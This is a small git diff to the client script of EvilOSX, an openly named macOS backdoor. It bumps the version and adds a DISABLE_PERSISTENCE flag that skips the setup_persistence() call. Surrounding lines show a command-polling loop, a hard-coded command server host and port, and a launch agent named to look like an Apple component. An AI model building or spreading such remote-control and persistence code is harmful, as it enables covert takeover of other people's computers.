@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.1.0"
+__version__ = "1.1.1"
 
 import time
 import urllib2
@@ -27,6 +27,7 @@ SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 1337
 DEVELOPMENT = True
 LAUNCH_AGENT_NAME = "com.apple.EvilOSX"
+DISABLE_PERSISTENCE = False
 
 COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.
 IDLE_TIME = 60  # Time in seconds after which the client will become idle.
@@ -373,7 +374,7 @@ def main():
     tasks = []  # List of tuples containing the task name and thread.
 
     if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
-        if not DEVELOPMENT:
+        if not DEVELOPMENT and not DISABLE_PERSISTENCE:
             # Setup persistence.
             setup_persistence()
 
